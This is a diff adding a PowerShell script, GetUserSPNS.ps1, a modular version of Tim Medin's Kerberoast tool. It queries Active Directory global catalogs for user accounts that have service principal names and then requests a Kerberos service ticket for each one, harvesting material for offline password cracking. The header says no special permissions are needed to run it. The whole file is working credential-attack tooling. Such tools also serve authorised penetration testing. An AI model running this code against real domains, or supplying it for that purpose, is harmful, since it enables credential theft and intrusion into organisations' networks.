@@ -1,0 +1,102 @@
+# Edits by Tim Medin
+# File:     GetUserSPNS.ps1
+# Contents: Query the domain to find SPNs that use User accounts
+# Comments: This is for use with Kerberoast https://github.com/nidem/kerberoast
+#           The password hash used with Computer accounts are infeasible to 
+#           crack; however, if the User account associated with an SPN may have
+#           a crackable password. This tool will find those accounts. You do not
+#           need any special local or domain permissions to run this script. 
+#           This script on a script supplied by Microsoft (details below).
+# History:  
+#			2016/09/02     Aaron Jewitt	Modified the script to make it modular. 
+#			2016/07/07     Tim Medin    Add -UniqueAccounts parameter to only get unique SAMAccountNames
+#           2016/04/12     Tim Medin    Added -Request option to automatically get the tickets
+#           2014/11/12     Tim Medin    Created
+
+function Get-GCs {
+	# Returns an array containing the names of each of the GCs in the forest
+	$GCs = @()
+    $ForestInfo = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
+    $CurrentGCs = $ForestInfo.FindAllGlobalCatalogs()
+    ForEach ($GC in $CurrentGCs) {
+      $GCs += $GC.Name
+      #$GCs += $ForestInfo.ApplicationPartitions[0].SecurityReferenceDomain
+    }
+    if (-not $GCs) {
+      # no Global Catalogs Found
+      Write-Host "No Global Catalogs Found!"
+      Exit
+    }
+	return $GCs
+}
+
+
+function Get-UserSPNS {
+	# return an array of objects. Each object contains information on a user account that has an SPN 
+    [CmdletBinding()]
+    Param(
+      #[Parameter(Mandatory=$False,Position=1)] [string]$GCName,
+
+      [Parameter(Mandatory=$False)] [string]$Filter,
+      #[Parameter(Mandatory=$False)] [switch]$Request,
+      [Parameter(Mandatory=$False)] [switch]$UniqueAccounts
+    )
+
+    Add-Type -AssemblyName System.IdentityModel
+
+    $GCs = Get-GCs
+	# $accounts will be the returned object
+	[System.Collections.ArrayList]$accounts = @()
+	[System.Collections.ArrayList]$accountlist = @()
+	
+    ForEach ($GC in $GCs) {
+        write-host "Querying $GC"
+        $searcher = New-Object System.DirectoryServices.DirectorySearcher
+        $searcher.SearchRoot = "LDAP://" + $GC
+        $searcher.PageSize = 1000
+        $searcher.Filter = "(&(!objectClass=computer)(servicePrincipalName=*))"
+        $searcher.PropertiesToLoad.Add("serviceprincipalname") | Out-Null
+        $searcher.PropertiesToLoad.Add("name") | Out-Null
+        $searcher.PropertiesToLoad.Add("samaccountname") | Out-Null
+        $searcher.PropertiesToLoad.Add("memberof") | Out-Null
+        $searcher.PropertiesToLoad.Add("pwdlastset") | Out-Null
+        $searcher.SearchScope = "Subtree"
+
+        $results = $searcher.FindAll()
+        write-host "Accountlist --------------------------------"
+        Write-Host $accountlist
+        write-host "--------------------------------------------"
+        foreach ($result in $results) {
+            # check to see if we already have this account
+            foreach ($spn in $result.Properties["serviceprincipalname"]) {
+                if ($accountlist.Contains($result.Properties["samaccountname"][0].ToString())){
+#                Write-Host "Duplicate " $result.Properties["samaccountname"][0].ToString()
+                } 
+                else {
+                $o = Select-Object -InputObject $result -Property `
+                    @{Name="ServicePrincipalName"; Expression={$spn.ToString()} }, `
+                    @{Name="Name";                 Expression={$result.Properties["name"][0].ToString()} }, `
+                    @{Name="SAMAccountName";       Expression={$result.Properties["samaccountname"][0].ToString()} }, `
+                    @{Name="MemberOf";             Expression={$result.Properties["memberof"][0].ToString()} }, `
+                    @{Name="PasswordLastSet";      Expression={[datetime]::fromFileTime($result.Properties["pwdlastset"][0])} }
+                $accounts.Add($o) | Out-Null
+                Write-Host "Adding " $result.Properties["samaccountname"][0].ToString()
+                $accountlist.Add($result.Properties["samaccountname"][0].ToString()) | Out-Null
+                }
+            }
+
+        }
+    }
+	# Accounts
+	return $accounts
+}
+
+function Get-KerbTokens {
+    $list =  Get-UserSPNS
+    $count = 1
+    foreach ($account in $list){
+        write-host "Requesting token $count from " $account.ServicePrincipalName.ToString()
+        $count++
+        New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $account.ServicePrincipalName.ToString() | Out-Null
+    }
+}
